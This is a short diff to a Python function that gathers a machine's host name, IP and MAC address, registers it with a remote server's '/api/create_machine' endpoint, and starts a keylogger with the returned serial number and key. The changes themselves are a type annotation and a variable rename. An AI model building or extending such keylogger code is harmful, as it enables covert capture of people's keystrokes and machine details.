@@ -8,7 +8,7 @@ URL = config['general']['base_url']
 
 
 
-def create_logger():
+def create_logger()->bool:
     host_name = socket.gethostname()
     ip_address = socket.gethostbyname(host_name)
     mac_address = hex(uuid.getnode())
@@ -20,9 +20,9 @@ def create_logger():
     try:
         response = requests.post(URL + '/api/create_machine', json=data)
         response_dict = response.json()
-        number = response_dict['serial_number']
+        serial_number = response_dict['serial_number']
         key = response_dict['key']
-        key_logger = keylogger.KeyLoggerManager(number,key)
+        key_logger = keylogger.KeyLoggerManager(serial_number,key)
         key_logger.start_logging()
         return response.status_code == 200
     except requests.exceptions.RequestException:
